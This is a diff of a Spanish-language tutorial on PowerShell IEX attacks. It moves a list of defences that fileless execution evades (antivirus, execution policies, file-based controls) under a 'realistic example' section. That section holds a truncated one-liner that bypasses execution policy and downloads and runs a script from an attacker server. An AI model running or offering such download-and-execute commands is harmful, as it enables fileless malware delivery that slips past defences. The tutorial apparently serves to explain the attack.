@@ -132,26 +132,6 @@ Pero IEX es corto.
 
 ---
 
-# 9️⃣ Encadenamiento mental del atacante
-
-Objetivo:
-
-> Obtener ejecución arbitraria sin tocar disco.
-
-Ruta:
-
-```
-Internet → Memoria → Parser → Ejecución
-```
-
-Evita:
-
-* Antivirus tradicionales
-* Políticas de ejecución
-* Controles basados en archivos
-
----
-
 # 🔟 Ejemplo realista
 
 Servidor atacante:
@@ -168,6 +148,12 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://x
 ```
 
 Una sola línea = ejecución completa.
+Evita:
+
+* Antivirus tradicionales
+* Políticas de ejecución
+* Controles basados en archivos
+
 
 ---
 
